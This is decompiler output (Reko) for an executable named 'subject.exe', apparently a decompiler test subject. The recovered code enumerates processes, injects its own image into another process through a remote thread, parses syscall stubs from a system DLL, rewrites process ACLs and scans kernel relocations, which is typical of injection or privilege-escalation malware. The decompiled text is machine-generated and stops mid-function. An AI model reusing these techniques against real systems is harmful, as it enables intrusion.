// subject.c
// Generated by decompiling subject.exe
// using Reko decompiler version VERSION

#include "subject.h"

// 13141340: Register word32 fn13141340(Register word32 edx, Register word32 ebx, Register ptr32 ebp, Register (ptr Eq_6) es, Register (ptr Eq_7) ds, Stack word32 dwArg04)
word32 fn13141340(word32 edx, word32 ebx, ptr32 ebp, Eq_6 * es, Eq_7 * ds, word32 dwArg04)
{
	Eq_9 eax_108;
	ui32 eax_9 = globals->dw13144000 ^ fp - 0x04;
	byte SCZO_27;
	word32 eax_28;
	byte SZO_29;
	byte C_30;
	word32 esi_31;
	word32 edi_32;
	byte Z_33;
	word32 ecx_34;
	struct Eq_25 * esp_107;
	struct Eq_7 * ds_112;
	struct Eq_6 * es_113;
	word32 ebx_114;
	uint32 edx_115;
	struct Eq_30 * ebp_102;
	KERNEL32.dll!CreateToolhelp32Snapshot();
	if (eax_28 == ~0x00)
		eax_108 = 0x00;
	else
	{
		Eq_9 esi_101;
		*(esp_107 - 0x04) = fp - 0x0130;
		*(esp_107 - 0x08) = eax_28;
		byte SCZO_76;
		word32 eax_77;
		byte SZO_78;
		byte C_79;
		byte Z_82;
		word32 ecx_83;
		Eq_53 edi_117;
		word32 esi_119;
		word32 esp_103;
		KERNEL32.dll!Process32First();
		if ((fp - 0x0130 & fp - 0x0130) == 0x00)
			esi_101 = 0x00;
		else
		{
			do
			{
				union Eq_53 * esp_123 = esp_103 - 0x04;
				*esp_123 = (union Eq_53 *) (fp - 0x010C);
				*(esp_123 - 0x04) = esi_119;
				if (lstrcmpiA(*(esp_123 - 0x04), *esp_123) == 0x00)
				{
					*esp_123 = (union Eq_53 *) edi_117;
					CloseHandle(*esp_123);
					esp_107 = (struct Eq_25 *) ((char *) esp_123 + 0x04);
					eax_108 = dwLoc0128;
					return fn131420E0(eax_108, eax_9 ^ fp - 0x04, edx_115, ebx_114, ebp_102, esp_107->dw0004, esp_107->dw0000, es_113, ds_112, ebp);
				}
				*esp_123 = (union Eq_53 *) (fp - 0x0130);
				*(esp_123 - 0x04) = (union Eq_53 *) edi_117;
				byte SCZO_139;
				word32 eax_140;
				byte SZO_141;
				byte C_142;
				byte Z_145;
				word32 ecx_146;
				KERNEL32.dll!Process32Next();
			} while ((fp - (void *) 0x0130 & fp - (void *) 0x0130) != 0x00);
			esi_101 = 0x01;
		}
		union Eq_53 * esp_104 = esp_103 - 0x04;
		*esp_104 = (union Eq_53 *) edi_117;
		CloseHandle(*esp_104);
		esp_107 = (struct Eq_25 *) ((char *) esp_104 + 0x04);
		eax_108 = esi_101;
	}
	return fn131420E0(eax_108, eax_9 ^ fp - 0x04, edx_115, ebx_114, ebp_102, esp_107->dw0004, esp_107->dw0000, es_113, ds_112, ebp);
}

// 131413D7: void fn131413D7(Register Eq_161 ecx, Stack word32 dwArg04, Stack word32 dwArg08)
void fn131413D7(Eq_161 ecx, word32 dwArg04, word32 dwArg08)
{
	Eq_164 eax_22 = GetModuleHandleA(0x00);
	Eq_161 edi_27 = *((word32) eax_22 + ((word32) (*((word32) eax_22 + 0x003C)) + 0x0050));
	Eq_164 eax_40 = VirtualAllocEx(dwArg04, eax_22, edi_27, 0x3000, 0x40);
	if (eax_40 != 0x00)
	{
		WriteProcessMemory(dwArg04, eax_40, eax_22, edi_27, fp - 0x08);
		if (ecx == edi_27)
		{
			Eq_161 eax_99 = fp - 0x0C ^ fp - 0x0C;
			CreateRemoteThread(dwArg04, eax_99, eax_99, dwArg08, eax_40, eax_99, fp - 0x0C);
			return;
		}
	}
	return;
}

// 13141442: Register word32 fn13141442(Stack Eq_53 dwArg04)
word32 fn13141442(Eq_53 dwArg04)
{
	byte * ecx_15 = dwArg04;
	word32 eax_14 = 0x00;
	if (*dwArg04 != 0x00)
	{
		do
		{
			eax_14 = eax_14 + 0x01;
			ecx_15 = ecx_15 + 0x01;
		} while (*ecx_15 != 0x00);
	}
	return eax_14;
}

// 13141454: Register word32 fn13141454(Stack word32 dwArg04, Stack word32 dwArg08, Register out ptr32 edxOut)
word32 fn13141454(word32 dwArg04, word32 dwArg08, ptr32 & edxOut)
{
	*edxOut = edx;
	byte * ecx_3 = dwArg04;
	byte al_5 = *dwArg04;
	byte * esi_101 = dwArg08;
	if (al_5 != 0x00)
	{
l13141463:
		byte dl_80 = *esi_101;
		edx = DPB(edx, dl_80, 0);
		*edxOut = edx;
		if (dl_80 != 0x00)
		{
			if (al_5 != dl_80)
				return 0x00;
			ecx_3 = ecx_3 + 0x01;
			al_5 = *ecx_3;
			esi_101 = esi_101 + 0x01;
			if (al_5 != 0x00)
				goto l13141463;
		}
		al_5 = *ecx_3;
		if (al_5 != 0x00)
		{
			if (*esi_101 == 0x00)
				return 0x00;
l13141489:
			if (al_5 == 0x00)
				return 0x00;
			return 0x01;
		}
	}
	if (*esi_101 == 0x00)
		return 0x01;
	goto l13141489;
}

// 13141492: Register (ptr Eq_294) fn13141492(Stack Eq_164 dwArg04, Stack ptr32 dwArg08, Stack ptr32 dwArg0C, Stack ptr32 dwArg10, Stack ptr32 dwArg14, Register out ptr32 edxOut)
Eq_294 * fn13141492(Eq_164 dwArg04, ptr32 dwArg08, ptr32 dwArg0C, ptr32 dwArg10, ptr32 dwArg14, ptr32 & edxOut)
{
	*edxOut = edx;
	struct Eq_294 * eax_102;
	struct Eq_304 * esi_10 = dwArg04;
	if (dwArg04->dw0000 == 23117)
	{
		eax = Mem0[dwArg04 + 0x3C:word32] + dwArg04;
		if (eax[0x05] == 0xE0)
		{
			word32 * edi_51 = dwArg08;
			word32 ecx_54 = 0x10;
			while (ecx_54 != 0x00)
			{
				*edi_51 = esi_10->dw0000;
				esi_10 = esi_10 + 0x01;
				edi_51 = edi_51 + 0x01;
				ecx_54 = ecx_54 - 0x01;
			}
			word32 * edi_65 = dwArg0C;
			word32 ecx_68 = 0x06;
			struct Eq_294 * esi_71 = eax;
			while (ecx_68 != 0x00)
			{
				*edi_65 = esi_71->dw0000;
				esi_71 = esi_71 + 0x01;
				edi_65 = edi_65 + 0x01;
				ecx_68 = ecx_68 - 0x01;
			}
			word32 * edi_84 = dwArg10;
			word32 ecx_87 = 0x38;
			word32 * esi_89 = eax + 0x06;
			while (ecx_87 != 0x00)
			{
				*edi_84 = *esi_89;
				esi_89 = esi_89 + 0x01;
				edi_84 = edi_84 + 0x01;
				ecx_87 = ecx_87 - 0x01;
			}
			*dwArg14 = eax + 0x003E;
			word32 edx_98;
			*edxOut = eax + 0x003E;
			eax_102 = DPB(dwArg14, 0x01, 0);
			return eax_102;
		}
	}
	eax_102 = DPB(eax, 0x00, 0);
	return eax_102;
}

// 131414E2: Register int32 fn131414E2(Stack ptr32 dwArg08, Stack ptr32 dwArg0C, Stack Eq_161 dwArg10, Register out ptr32 edxOut)
int32 fn131414E2(ptr32 dwArg08, ptr32 dwArg0C, Eq_161 dwArg10, ptr32 & edxOut)
{
	int32 ecx_100 = dwArg0C->dw003C;
	Eq_401 esi_13 = dwArg0C->t0020;
	uint64 edx_eax_16 = (uint64) (uint32) ecx_100;
	uint32 edx_18 = (uint32) (edx_eax_16 % esi_13);
	*edxOut = edx_18;
	Eq_412 eax_19 = (uint32) (edx_eax_16 /u esi_13);
	if (edx_18 != 0x00)
		ecx_100 = ((word32) eax_19 + 0x01) *s esi_13;
	int32 eax_29 = (word32) dwArg08->w0006;
	if (eax_29 > 0x00)
	{
		struct Eq_428 * ebx_61 = dwArg10 + 0x08;
		int32 dwArg0C_63 = eax_29;
		do
		{
			word32 edi_71 = ebx_61->dw0000;
			if (edi_71 != 0x00)
			{
				uint64 edx_eax_92 = (uint64) (uint32) edi_71;
				uint32 edx_94 = (uint32) (edx_eax_92 % esi_13);
				*edxOut = edx_94;
				Eq_448 eax_95 = (uint32) (edx_eax_92 /u esi_13);
				if (edx_94 == 0x00)
					ecx_100 = ecx_100 + edi_71;
				else
					ecx_100 = ecx_100 + ((word32) eax_95 + 0x01) *s esi_13;
			}
			int32 v17_82 = dwArg0C_63 - 0x01;
			ebx_61 = ebx_61 + 0x01;
			dwArg0C_63 = v17_82;
		} while (v17_82 != 0x00);
	}
	return ecx_100;
}

// 1314153E: Register int32 fn1314153E(Stack word32 dwArg04, Stack word32 dwArg08, Register out ptr32 edxOut)
int32 fn1314153E(word32 dwArg04, word32 dwArg08, ptr32 & edxOut)
{
	uint64 edx_eax_5 = (uint64) (uint32) dwArg04;
	uint32 edx_8 = (uint32) (edx_eax_5 % dwArg08);
	*edxOut = edx_8;
	Eq_476 eax_9 = (uint32) (edx_eax_5 /u dwArg08);
	if (edx_8 != 0x00)
		return ((word32) eax_9 + 0x01) *s dwArg08;
	else
		return dwArg04;
}

// 13141558: FlagGroup bool fn13141558(Register ptr32 ebp, Stack Eq_164 dwArg04, Stack ptr32 dwArg10, Stack Eq_164 dwArg18, Register out ptr32 eaxOut, Register out ptr32 edxOut)
bool fn13141558(ptr32 ebp, Eq_164 dwArg04, ptr32 dwArg10, Eq_164 dwArg18, ptr32 & eaxOut, ptr32 & edxOut)
{
	struct Eq_491 * esi_27;
	word32 edi_28;
	struct Eq_493 * ebp_100;
	bool D_130 = fn131420F0(dwArg18, dwArg04, dwArg10->dw003C, out ebp_100, out esi_27, out edi_28);
	*(fp - 0x1C) = esi_27->dw0020;
	*(fp - 0x20) = esi_27->dw003C;
	word32 edx_37;
	word32 ebx_140 = ebp_100->ptr001C + fn1314153E(dwArg00, dwArg04, out edx_37) / 0x08;
	struct Eq_539 * eax_103 = ebp_100->ptr0010;
	ebp_100->ptr001C = ebp_100->ptr001C & 0x00;
	if (eax_103->w0006 > 0x00)
	{
		*(fp - 0x10) = edi_28;
		struct Eq_567 * edi_106 = ebp_100->dw0018 + 0x08;
		do
		{
			uint32 eax_87 = edi_106->dw0008;
			if (true)
			{
				uint32 ecx_111 = eax_87;
				uint32 eax_112 = edi_106->dw0000;
				if (eax_87 > eax_112)
					ecx_111 = eax_112;
				word32 eax_118 = edi_106->dw000C + ebp_100->dw0008;
				*(fp - 0x14) = ecx_111;
				*(fp - 0x18) = eax_118;
				*(fp - 0x1C) = ebx_140;
				struct Eq_624 * esi_128;
				D_130 = fn131420F0(dwArg00, dwArg04, dwArg08, out ebp_100, out esi_128, out edi_106);
				*(fp - 0x20) = esi_128->dw0020;
				*(fp - 0x24) = edi_106->dw0000;
				word32 edx_137;
				ebx_140 = ebx_140 + fn1314153E(dwArg00, dwArg04, out edx_137);
			}
			eax_103 = (word32) ebp_100->ptr0010->w0006;
			ebp_100->ptr001C = (struct Eq_539 *) ((char *) ebp_100->ptr001C + 0x01);
			edi_106 = edi_106 + 0x01;
		} while (ebp_100->ptr001C < eax_103);
	}
	word32 eax_65;
	*eaxOut = (struct Eq_560 *) DPB(eax_103, 0x01, 0);
	return D_130;
}

// 131415DD: FlagGroup bool fn131415DD(Register ptr32 ebp, Register (ptr Eq_6) es, Register (ptr Eq_7) ds, Stack Eq_164 dwArg04, Register out Eq_661 eaxOut, Register out ptr32 edxOut)
bool fn131415DD(ptr32 ebp, Eq_6 * es, Eq_7 * ds, Eq_164 dwArg04, Eq_661 & eaxOut, ptr32 & edxOut)
{
	Eq_9 eax_154;
	GetSystemDirectoryA(fp - 0x0110, 0x0104);
	struct Eq_30 * ebp_152 = fp - 0x01D4;
	uint32 edx_144 = fn13141442(dwArg04) + fn13141442(fp - 0x0110);
	*edxOut = edx_144;
	word32 * esp_127 = fp - 668;
	if (edx_144 >= 0x0104)
		eax_154 = 0x00;
	else
	{
		lstrcatA(fp - 0x0110, dwArg04);
		Eq_53 eax_125 = CreateFileA(fp - 0x0110, 0x80000000, 0x01, 0x00, 0x03, 0x00, 0x00);
		esp_127 = fp - 668;
		if (eax_125 != ~0x00)
		{
			GetFileInformationByHandle(eax_125, fp - 0x01B0);
			ptr32 esp_162 = fp - 668;
			if (dwLoc018C != 0x00)
			{
				Eq_164 eax_206 = HeapAlloc(GetProcessHeap(), 0x00, dwLoc018C);
				esp_162 = fp - 668;
				if (eax_206 != 0x00)
				{
					if (ReadFile(eax_125, eax_206, dwLoc018C, fp - 0x0164, null) != 0x00 && dwLoc0164 == dwLoc018C)
					{
						word32 edx_284;
						if ((byte) fn13141492(eax_206, fp - 336, fp - 0x017C, fp - 656, fp - 0x0154, out edx_284) != 0x00)
						{
							word32 edx_303;
							Eq_164 eax_313 = HeapAlloc(GetProcessHeap(), 0x00, fn131414E2(fp - 0x017C, fp - 656, dwLoc018C, out edx_303));
							if (eax_313 != 0x00)
							{
								word32 eax_337;
								word32 edx_338;
								fn13141558(fp - 0x01D4, eax_206, fp - 656, eax_313, out eax_337, out edx_338);
							}
						}
					}
					*(fp - 0x02A0) = *(fp - 344);
					*(fp - 676) = 0x00;
					*(esp_244 - 0x04) = (union Eq_53 *) GetProcessHeap();
					HeapFree(*(esp_244 - 0x04), esp_244->t0000, esp_244->t0004);
					esp_162 = (char *) &esp_244->t0004 + 0x04;
				}
			}
			union Eq_53 * esp_193 = esp_162 - 0x04;
			*esp_193 = (union Eq_53 *) ebp_152->t0078;
			CloseHandle(*esp_193);
			esp_127 = (word32 *) ((char *) esp_193 + 0x04);
		}
		eax_154 = ebp_152->t0074;
	}
	struct Eq_723 * esp_70 = esp_127 + 0x01;
	word32 eax_78;
	*eaxOut = fn131420E0(eax_154, ebp_152->dw01CC ^ ebp_152, edx_144, esp_70->dw0004, ebp_152, esp_70->dw0000, *esp_127, es, ds, ebp);
	return D;
}

// 1314177C: Register word32 fn1314177C(Stack Eq_164 dwArg04, Stack ptr32 dwArg08, Register out ptr32 edxOut)
word32 fn1314177C(Eq_164 dwArg04, ptr32 dwArg08, ptr32 & edxOut)
{
	*edxOut = edx;
	word32 eax_117;
	if (dwArg04 != null && dwArg08 != 0x00)
	{
		word32 eax_77 = Mem0[Mem0[dwArg04 + 0x3C:word32] + 0x78 + dwArg04:word32] + dwArg04;
		uint32 dwArg04_110 = dwArg04 & 0x00;
		uint32 ecx_78 = eax_77->dw0018;
		word32 eax_82[] = dwArg04 + eax_77->dw001C / 0x0040;
		word32 esi_83[] = dwArg04 + eax_77->dw0020 / 0x0040;
		word16 ebx_84[] = dwArg04 + eax_77->dw0024 / 0x0040;
		if (true)
		{
			do
			{
				word32 edx_101;
				if (fn13141454(dwArg04 + esi_83[dwArg04_110] / 0x0040, dwArg08, out edx_101) == 0x01)
				{
					eax_117 = eax_82[(word32) ebx_84[dwArg04_110]];
					return eax_117;
				}
				uint32 v16_109 = dwArg04_110 + 0x01;
				dwArg04_110 = v16_109;
			} while (v16_109 < ecx_78);
		}
	}
	eax_117 = 0x00;
	return eax_117;
}

// 131417F3: Register (ptr Eq_958) fn131417F3(Stack Eq_164 dwArg04, Stack ptr32 dwArg08, Stack ptr32 dwArg0C, Register out ptr32 ediOut)
Eq_958 * fn131417F3(Eq_164 dwArg04, ptr32 dwArg08, ptr32 dwArg0C, ptr32 & ediOut)
{
	*ediOut = edi;
	if (dwArg04 == null)
		return ecx;
	word32 eax_53 = Mem0[Mem0[dwArg04 + 0x3C:word32] + 0x78 + dwArg04:word32] + dwArg04;
	ecx = eax_53->ptr0018;
	word32 eax_62[] = dwArg04 + eax_53->dw001C / 0x0040;
	struct Eq_958 * edx_111 = null;
	word32 edi_64[] = dwArg04 + eax_53->dw0020 / 0x0040;
	word16 ebx_65[] = dwArg04 + eax_53->dw0024 / 0x0040;
	struct Eq_958 * dwArg04_114 = null;
	if (false)
	{
l131418A6:
		word32 edi_86;
		*ediOut = esi;
		return ecx;
	}
l13141838:
	bool Z_116;
	ecx = (struct Eq_958 *) (dwArg04 + eax_62[(word32) ebx_65[edx_111]] / 0x0040);
	word32 edx_102 = dwArg04 + edi_64[edx_111] / 0x0040;
	if (globals->t13144028 == 0x00)
	{
		if (ecx->b0000 != 0xB8 || ecx->b0009 != ~0x32)
			goto l1314189A;
		Z_116 = cond(ecx->b000A - 0x2E);
	}
	else
	{
		if (globals->t13144028 != 0x01 || (ecx->b0000 != 0xB8 || (ecx->b0005 != ~0x45 || (ecx->b0006 != 0x00 || (ecx->b0007 != 0x03 || ecx->b0008 != ~0x01)))))
			goto l1314189A;
		Z_116 = cond(ecx->b0009 - 0x7F);
	}
	if (!Z_116)
	{
		ecx = ecx->ptr0001;
		if (ecx < dwArg0C)
			dwArg08[ecx] = edx_102;
	}
l1314189A:
	edx_111 = &dwArg04_114->ptr0001;
	dwArg04_114 = edx_111;
	if (edx_111 < ecx)
		goto l13141838;
	goto l131418A6;
}

// 131418AE: Register word32 fn131418AE()
word32 fn131418AE()
{
	Eq_164 eax_10 = GetModuleHandleA(0x13141154);
	globals->t13144030 = GetProcAddress(eax_10, 0x13141134);
	globals->t13144038 = GetProcAddress(eax_10, 320082208);
	globals->t13144040 = GetProcAddress(eax_10, 0x13141108);
	globals->t1314403C = GetProcAddress(eax_10, 0x131410F8);
	globals->t13144020 = GetProcAddress(eax_10, 0x131410E4);
	globals->t13144024 = GetProcAddress(eax_10, 0x131410CC);
	Eq_1094 eax_60 = GetProcAddress(eax_10, 0x131410B0);
	globals->t1314402C = eax_60;
	if (globals->t13144030 == null || (globals->t13144038 == null || (globals->t13144040 == null || (globals->t1314403C == null || (globals->t13144020 == null || (globals->t13144024 == null || eax_60 == null))))))
		return 0x00;
	else
		return 0x01;
}

// 1314195D: Register ui32 fn1314195D()
ui32 fn1314195D()
{
	ptr32 esp_14;
	word32 ebp_15;
	byte SCZO_16;
	word32 eax_17;
	byte SZO_18;
	byte C_19;
	byte Z_20;
	word32 ecx_21;
	globals->t13144038();
	*(esp_14 - 0x04) = 0x01;
	*(esp_14 - 0x08) = fp - 0x10;
	*(esp_14 - 0x0C) = fp - 0x18;
	ptr32 esp_30;
	word32 ebp_31;
	byte SCZO_32;
	byte SZO_34;
	byte C_35;
	byte Z_36;
	word32 ecx_37;
	ui32 eax_33;
	globals->t13144030();
	if (eax_33 == 0x00)
	{
		*(esp_30 - 0x04) = fp - 0x30;
		*(esp_30 - 0x08) = 0x06;
		*(esp_30 - 0x0C) = fp - 0x08;
		word32 esp_95;
		word32 ebp_96;
		byte SCZO_97;
		byte SZO_99;
		byte C_100;
		byte Z_101;
		word32 ecx_102;
		globals->t1314403C();
		if (eax_33 == 0x00)
			return dwLoc08;
	}
	return eax_33 | ~0x00;
}

// 131419C3: Register word32 fn131419C3(Stack Eq_164 dwArg04, Stack ptr32 dwArg08, Stack ptr32 dwArg0C, Stack ptr32 dwArg10, Register out ptr32 edxOut, Register out ptr32 esiOut, Register out ptr32 ediOut)
word32 fn131419C3(Eq_164 dwArg04, ptr32 dwArg08, ptr32 dwArg0C, ptr32 dwArg10, ptr32 & edxOut, ptr32 & esiOut, ptr32 & ediOut)
{
	word32 eax_67;
	*dwArg10 = 0x00;
	struct Eq_1248 * esp_54;
	word32 ebp_55;
	word32 ecx_56;
	word32 eax_57;
	word32 * esi_58;
	word32 edi_59;
	word32 edx_60;
	byte SZO_61;
	byte C_62;
	byte Z_63;
	globals->t13144020();
	word32 ecx_31 = *dwArg08;
	if (eax_57 != 0x00)
		eax_67 = 0x00;
	else
	{
		*esi_58 = ecx_31;
		eax_67 = 0x01;
	}
	word32 edi_70;
	*ediOut = esp_54->dw0000;
	word32 esi_72;
	*esiOut = esp_54->dw0004;
	return eax_67;
}

// 13141A0C: void fn13141A0C(Stack Eq_164 dwArg04)
void fn13141A0C(Eq_164 dwArg04)
{
	word32 esp_9;
	globals->t13144024();
	return;
}

// 13141A19: Register word32 fn13141A19(Register uint32 edx, Register word32 ebx, Register ptr32 ebp, Register (ptr Eq_6) es, Register (ptr Eq_7) ds, Register out ptr32 ediOut)
word32 fn13141A19(uint32 edx, word32 ebx, ptr32 ebp, Eq_6 * es, Eq_7 * ds, ptr32 & ediOut)
{
	Eq_9 eax_129;
	ptr32 esp_25;
	word32 ebp_26;
	byte SCZO_27;
	word32 eax_28;
	byte SZO_29;
	byte C_30;
	word32 esi_31;
	word32 edi_32;
	byte Z_33;
	word32 ecx_34;
	word32 edx_35;
	word32 ebx_36;
	struct Eq_1306 * es_37;
	struct Eq_1307 * ds_38;
	globals->t13144038();
	ui32 eax_9 = globals->dw13144000 ^ fp - 232;
	*(esp_25 - 0x04) = 0x01;
	*(esp_25 - 0x08) = fp - 0x0168;
	*(esp_25 - 0x0C) = fp - 0x0160;
	byte SCZO_53;
	word32 eax_54;
	byte SZO_55;
	byte C_56;
	word32 esi_57;
	word32 edi_58;
	byte Z_59;
	word32 ecx_60;
	struct Eq_7 * ds_118;
	struct Eq_6 * es_119;
	word32 ebx_120;
	uint32 edx_121;
	struct Eq_30 * ebp_127;
	struct Eq_1350 * esp_128;
	globals->t13144030();
	if (eax_54 == 0x00)
	{
		*(esp_128 - 0x04) = fp - 0x0134;
		*(esp_128 - 0x08) = 0x00060000;
		*(esp_128 - 0x0C) = fp - 0x0114;
		byte SCZO_158;
		word32 eax_159;
		byte SZO_160;
		byte C_161;
		word32 esi_162;
		word32 edi_163;
		byte Z_164;
		word32 ecx_165;
		globals->t1314403C();
		if (eax_159 == 0x00)
		{
			*(esp_128 - 0x04) = fp - 344;
			*(esp_128 - 0x08) = 0x00;
			*(esp_128 - 0x0C) = fp - 0x0118;
			*(esp_128 - 0x10) = 0x00;
			*(esp_128 - 0x14) = 0x00;
			*(esp_128 - 0x18) = 0x04;
			*(esp_128 - 0x1C) = 0x06;
			*(esp_128 - 0x20) = dwLoc0114;
			byte SCZO_195;
			word32 eax_196;
			byte SZO_197;
			byte C_198;
			word32 edi_200;
			byte Z_201;
			word32 ecx_202;
			Eq_9 esi_199;
			ADVAPI32.dll!GetSecurityInfo();
			if ((fp - 0x0118 & fp - 0x0118) == 0x00)
			{
				*(esp_128 - 0x04) = (union Eq_1467 *) (fp - 0x011C);
				*(esp_128 - 0x08) = (union Eq_1474 *) (fp - 0x010C);
				GetUserNameA(*(esp_128 - 0x08), *(esp_128 - 0x04));
				*(esp_128 - 0x04) = (union Eq_1495 *) (fp - 0x0110);
				*(esp_128 - 0x08) = dwLoc0118;
				*(esp_128 - 0x0C) = (union Eq_1508 *) (fp - 0x0154);
				*(esp_128 - 0x10) = 0x01;
				byte SCZO_265;
				word32 eax_266;
				byte SZO_267;
				byte C_268;
				word32 edi_270;
				byte Z_271;
				word32 ecx_272;
				ADVAPI32.dll!SetEntriesInAclA();
				if ((fp - 0x0154 & fp - 0x0154) == 0x00)
				{
					*(esp_128 - 0x04) = 0x00;
					*(esp_128 - 0x08) = dwLoc0110;
					*(esp_128 - 0x0C) = 0x00;
					*(esp_128 - 0x10) = 0x00;
					*(esp_128 - 0x14) = 0x04;
					*(esp_128 - 0x18) = 0x06;
					*(esp_128 - 0x1C) = dwLoc0114;
					struct Eq_1350 * esp_297;
					byte SCZO_299;
					word32 eax_300;
					byte SZO_301;
					byte C_302;
					word32 edi_304;
					byte Z_305;
					word32 ecx_306;
					ADVAPI32.dll!SetSecurityInfo();
					if (eax_300 == 0x00)
						esi_199 = 0x01;
					*(esp_297 - 0x04) = dwLoc0110;
					LocalFree(*(esp_297 - 0x04));
					esp_128 = esp_297;
				}
			}
			eax_129 = esi_199;
l13141B22:
			word32 edi_98 = esp_128->dw0000;
			*ediOut = edi_98;
			word32 esi_103 = esp_128->dw0004;
			fn131420E0(eax_129, eax_9 ^ fp - 232, edx_121, ebx_120, ebp_127, esi_103, edi_98, es_119, ds_118, ebp);
			return esi_103;
		}
	}
	eax_129 = 0x00;
	goto l13141B22;
}

// 13141B39: Register word32 fn13141B39()
word32 fn13141B39()
{
	GetProcessHeap();
	struct Eq_1602 * esp_100 = fp - 0x18;
	Eq_161 edi_101 = 0x8000;
	while (true)
	{
		word32 eax_126;
		struct Eq_1611 * esp_36 = esp_100 - 0x04;
		esp_36->t0000 = edi_101;
		*(esp_36 - 0x04) = 0x00;
		*(esp_36 - 0x08) = esp_36->dw0014;
		Eq_164 eax_43 = HeapAlloc(*(esp_36 - 0x08), *(esp_36 - 0x04), esp_36->t0000);
		if (eax_43 == 0x00)
			break;
		esp_36->t0000.u0 = 0x00;
		*(esp_36 - 0x04) = (union Eq_161 *) edi_101;
		*(esp_36 - 0x08) = (union Eq_164 *) eax_43;
		*(esp_36 - 0x0C) = 11;
		struct Eq_1602 * esp_77;
		word32 ecx_78;
		word32 ebx_79;
		<anonymous> * ebp_80;
		uint32 * esi_81;
		ui32 edi_82;
		word32 eax_83;
		byte SZO_84;
		byte C_85;
		byte Z_86;
		byte SCZO_87;
		word32 edx_88;
		byte CZ_89;
		globals->t1314402C();
		if (eax_83 != 0xC0000004)
		{
			if (eax_83 == 0x00)
			{
				uint32 edx_127 = *esi_81;
				uint32 edi_128 = 0x00;
				struct Eq_1728 * eax_132 = esi_81 + 0x01 + 0x02;
				if (true)
				{
					ptr32 ebx_140 = esi_81 + 0x08;
					do
					{
						if (ebx_140 != 0x13141178)
						{
							esp_77->dw0014 = eax_132->dw0000;
							break;
						}
						eax_132 = eax_132 + 0x01;
						ebx_140 = ebx_140 + 0x011C;
						edi_128 = edi_128 + 0x01;
					} while (edi_128 < edx_127);
				}
			}
			*(esp_77 - 0x04) = esi_81;
			*(esp_77 - 0x08) = 0x00;
			*(esp_77 - 0x0C) = esp_77->dw0010;
			word32 esp_113;
			word32 ecx_114;
			word32 ebx_115;
			word32 ebp_116;
			word32 esi_117;
			word32 edi_118;
			word32 eax_119;
			byte SZO_120;
			byte C_121;
			byte Z_122;
			byte SCZO_123;
			word32 edx_124;
			byte CZ_125;
			ebp_80();
			eax_126 = edi_118;
			return eax_126;
		}
		*(esp_77 - 0x04) = esi_81;
		*(esp_77 - 0x08) = 0x00;
		*(esp_77 - 0x0C) = esp_77->dw0010;
		HeapFree(*(esp_77 - 0x0C), *(esp_77 - 0x08), *(esp_77 - 0x04));
		esp_100 = esp_77;
		edi_101 = edi_82 * 0x02;
	}
	eax_126 = 0x80400000;
	return eax_126;
}

// 13141BDF: Register word32 fn13141BDF(Stack word32 dwArg04, Stack word32 dwArg08, Stack (ptr Eq_1787) dwArg0C, Register out ptr32 edxOut)
word32 fn13141BDF(word32 dwArg04, word32 dwArg08, Eq_1787 * dwArg0C, ptr32 & edxOut)
{
	*edxOut = edx;
	word32 eax_116;
	word32 eax_18 = dwArg0C->dw0088;
	if (eax_18 != 0x00 && dwArg0C->dw008C != 0x00)
	{
		struct Eq_1805 * ecx_62 = dwArg04 + eax_18;
		dwArg0C_105 = dwArg0C;
		if (ecx_62[0x02] != 0x00)
		{
			do
			{
				struct Eq_1793 * dwArg0C_105;
				dwArg0C_105 = dwArg0C_105 & 0x00;
				struct Eq_1793 * edx_78 = ecx_62[0x02] - 0x08 >> 0x01;
				*edxOut = edx_78;
				struct Eq_1805 * esi_103 = ecx_62 + 0x04;
				if (edx_78 > null)
				{
					do
					{
						ui32 eax_94 = (word32) esi_103->t0000;
						if (((word16) eax_94 & 0xF000) == 0x3000 && (word32) ecx_62->t0000 + ((eax_94 & 0x0FFF) + dwArg0C->dw001C) == dwArg08)
						{
							eax_116 = 0x01;
							return eax_116;
						}
						struct Eq_1793 * v16_104 = (char *) dwArg0C_105 + 0x01;
						esi_103 = esi_103 + 0x01;
						dwArg0C_105 = v16_104;
					} while (v16_104 < edx_78);
				}
				ecx_62 = esi_103;
			} while (esi_103[0x02] != 0x00);
		}
	}
	eax_116 = 0x00;
	return eax_116;
}

// 13141C57: Register word32 fn13141C57(Register Eq_1865 ecx, Stack Eq_164 dwArg04, Stack ptr32 dwArg08, Stack ptr32 dwArg0C, Register out ptr32 edxOut)
word32 fn13141C57(Eq_1865 ecx, Eq_164 dwArg04, ptr32 dwArg08, ptr32 dwArg0C, ptr32 & edxOut)
{
	*edxOut = edx;
	word32 eax_186;
	Eq_1865 dwLoc08_112 = ecx;
	struct Eq_1787 * ecx_111 = dwArg0C;
	word32 esi_20 = dwArg0C->dw0088;
	if (esi_20 != 0x00 && dwArg0C->dw008C != 0x00)
	{
		union Eq_1888 * esi_121 = esi_20 + dwArg04;
		if (*((char *) esi_121 + 0x04) != 0x00)
		{
			do
			{
				dwLoc08_112 = dwLoc08_112 & 0x00;
				Eq_1865 edi_101 = *((char *) esi_121 + 0x04) - 0x08 >> 0x01;
				union Eq_1888 * ebx_104 = (char *) esi_121 + 0x08 + 0x04;
				if (edi_101 > 0x00)
				{
					do
					{
						ui32 eax_133 = (word32) *ebx_104;
						cui16 dx_135 = (word16) eax_133;
						word32 edx_137;
						*edxOut = DPB(eax_133, dx_135 & 0xF000, 0);
						if ((dx_135 & 0xF000) == 0x3000)
						{
							word32 edx_160 = ecx_111->dw001C + dwArg08;
							*edxOut = edx_160;
							struct Eq_1946 * eax_164 = (char *) *esi_121 + (eax_133 & 0x0FFF) + dwArg04;
							if (eax_164->dw0000 == edx_160 && *(eax_164 - 0x02) == 0x05C7)
							{
								word32 eax_169 = eax_164->dw0004;
								ecx_111 = dwArg0C;
								word32 edx_178;
								if (fn13141BDF(dwArg04, eax_169, ecx_111, out edx_178) != 0x00)
								{
									eax_186 = eax_169 - dwArg0C->dw001C;
									return eax_186;
								}
							}
						}
						Eq_1865 v17_154 = (word32) dwLoc08_112 + 0x01;
						ebx_104 = (union Eq_1888 *) ((char *) ebx_104 + 0x02);
						dwLoc08_112 = v17_154;
					} while (v17_154 < edi_101);
				}
				esi_121 = ebx_104;
			} while (*ebx_104 != 0x00);
		}
	}
	eax_186 = 0x00;
	return eax_186;
}

// 13141CFF: Register Eq_164 fn13141CFF(Stack Eq_164 dwArg04)
Eq_164 fn13141CFF(Eq_164 dwArg04)
{
	Eq_53 eax_3 = globals->t13144034;
	if (eax_3 == 0x00)
		return 0x00;
	else
		return HeapAlloc(eax_3, 0x00, dwArg04);
}

// 13141DC8: void fn13141DC8()
void fn13141DC8()
{
